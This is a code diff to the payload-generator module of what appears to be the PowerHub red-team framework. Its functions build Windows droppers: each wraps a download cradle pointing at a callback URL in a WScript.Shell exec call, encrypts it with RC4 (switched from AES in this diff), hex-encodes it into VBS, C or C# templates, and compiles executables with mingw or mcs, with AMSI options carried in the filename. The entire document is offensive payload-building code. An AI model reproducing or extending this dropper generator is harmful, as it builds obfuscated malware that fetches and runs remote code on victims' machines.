@@ -5,46 +5,44 @@ import os
 
 import jinja2
 
-from powerhub.tools import encrypt_aes, generate_random_key
+from powerhub.tools import encrypt_rc4, generate_random_key
 from powerhub.stager import build_cradle, symbol_name
+from powerhub.directories import directories
 
 log = logging.getLogger(__name__)
 
 
-def load_template(filename, **kwargs):
+def load_template(filename, **kwparameters):
     """Wrapper for loading a jinja2 template from file"""
     templateLoader = jinja2.FileSystemLoader(
-        searchpath="./powerhub/templates/payloads/"
+        searchpath=os.path.join(directories.BASE_DIR, "templates", "payloads")
     )
     templateEnv = jinja2.Environment(loader=templateLoader)
     TEMPLATE_FILE = filename
     template = templateEnv.get_template(TEMPLATE_FILE)
-    outputText = template.render(**kwargs)
+    outputText = template.render(**kwparameters)
     return outputText
 
 
-def create_filename(args):
+def create_filename(parameters):
     result = 'powerhub'
-    result += '-' + args['Launcher']
-    result += '-' + args['Amsi']
-    result += '-' + args['Transport']
-    if args['ClipExec'] != 'none':
-        result += '-' + args['ClipExec']
-    if args['Launcher'] in [
+    result += '-' + parameters['launcher']
+    result += '-' + parameters['amsi']
+    result += '-' + parameters['transport']
+    if str(parameters['clip-exec']) != '-1':
+        result += '-' + parameters['clip-exec']
+    if parameters['launcher'] in [
         'mingw32',
         'dotnetexe',
     ]:
-        if args['32bit'] == 'true':
-            result += '-' + '32bit'
-        else:
-            result += '-' + '64bit'
+        result += '-' + parameters['arch']
         result += '.exe'
-    elif args['Launcher'] == 'vbs':
+    elif parameters['launcher'] == 'vbs':
         result += ".vbs"
     return result
 
 
-def create_payload(args):
+def create_payload(parameters, key, callback_url):
     payload_generators = {
         "mingw32": create_exe,
         "dotnetexe": create_dotnet,
@@ -53,18 +51,17 @@ def create_payload(args):
         #  "rundll32": create_exe,
         #  "installutil": create_exe,
     }
-    return payload_generators[args['Launcher']](args)
+    return payload_generators[parameters['launcher']](parameters, key, callback_url)
 
 
-def create_vbs(args):
-    filename = create_filename(args)
-    args = dict(args)  # convert from immutable dict
-    args['Launcher'] = 'cmd_enc'
-    cmd = build_cradle(args).replace('\n', '')
+def create_vbs(parameters, key, callback_url):
+    filename = create_filename(parameters)
+    parameters.get_by_label('launcher').value = 'cmd_enc'
+    cmd = build_cradle(parameters, key, callback_url).replace('\n', '')
     cmd = ('CreateObject("WScript.Shell").' +
            'exec("%s")') % cmd
     key = generate_random_key(16)
-    cmd = encrypt_aes(cmd.encode(), key)
+    cmd = encrypt_rc4(cmd.encode(), key)
     vbs_code = load_template(
         'powerhub.vbs',
         HEX_CODE=' '.join('%02X' % c for c in cmd),
@@ -74,25 +71,25 @@ def create_vbs(args):
     return filename, vbs_code
 
 
-def create_docx(args):
-    _, vbs_code = create_vbs(args)
+def create_docx(parameters, key, callback_url):
+    _, vbs_code = create_vbs(parameters, key, callback_url)
     # randomize creator in docProps/core.xml
 
 
-def compile_source(args, source_file, compile_cmd, formatter):
-    filename = create_filename(args)
-    args = dict(args)  # convert from immutable dict
-    args['Launcher'] = 'cmd_enc'
-    cmd = build_cradle(args)
+def compile_source(parameters, key, callback_url, source_file, compile_cmd, formatter):
+    filename = create_filename(parameters)
+    parameters.get_by_label('launcher').value = 'cmd_enc'
+    cmd = build_cradle(parameters, key, callback_url)
     size = len(cmd)
     key = generate_random_key(16)
-    cmd = encrypt_aes(cmd.encode(), key)
+    cmd = encrypt_rc4(cmd.encode(), key)
     c_code = load_template(
         source_file,
         CMD=formatter(cmd),
         LEN_CMD=size,
         KEY=key,
     )
+    print(c_code)
 
     with tempfile.TemporaryDirectory() as tmpdirname:
         outfile = os.path.join(tmpdirname, 'powerhub.out')
@@ -116,28 +113,32 @@ def compile_source(args, source_file, compile_cmd, formatter):
     return filename, result
 
 
-def create_exe(args):
-    if args['32bit'] == 'true':
+def create_exe(parameters, key, callback_url):
+    if parameters['arch'] == '32bit':
         mingw = 'i686-w64-mingw32-gcc'
     else:
         mingw = 'x86_64-w64-mingw32-gcc'
 
     return compile_source(
-        args,
+        parameters,
+        key,
+        callback_url,
         'powerhub.c',
         lambda outfile: [mingw, "-Wall", "-x", "c", "-o", outfile],
         lambda cmd: ''.join('\\x%02x' % c for c in cmd),
     )
 
 
-def create_dotnet(args):
-    if args['32bit'] == 'true':
+def create_dotnet(parameters, key, callback_url):
+    if parameters['arch'] == '32bit':
         platform = "x86"
     else:
         platform = "x64"
 
     return compile_source(
-        args,
+        parameters,
+        key,
+        callback_url,
         'powerhub.cs',
         lambda outfile: ["mcs", "-warnaserror",
                          "-platform:" + platform, "-out:" + outfile],
